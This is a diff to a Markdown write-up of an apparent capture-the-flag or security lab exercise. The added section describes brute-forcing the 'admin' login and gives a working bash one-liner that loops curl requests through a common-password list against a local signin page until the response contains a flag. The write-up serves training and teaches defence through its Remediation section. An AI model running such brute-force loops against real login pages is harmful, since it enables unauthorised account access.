@@ -46,7 +46,13 @@ To check username in the `db_default` table, this query needs to be run
 Once we run the query, we know there are two users `admin`, and `root` exists for login.
 
 
-rest: brute force with password
+Of course the password can be retrieved with sending a query to the `Member_Brute_Force` table, we can also try using the Brute Force Method. In order to do so, the following script can be run, with password in [here](./2020-200_most_used_passwords.txt), [2020-200-most_used_passwords.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/2020-200_most_used_passwords.txt) from [SecLists](https://github.com/danielmiessler/SecLists)
+
+
+```
+cat 2020-200_most_used_passwords.txt| while read password; do flag=$(curl -L "http://192.168.1.17:4242/?page=signin&username=admin&password=${password}&Login=Login" 2>/dev/null |  grep "flag" | wc -l); if [[ "${flag}" -eq 1 ]]; then echo "Success: The password is ${password}";break 2; fi; done
+```
+
 
 ## Remediation
 
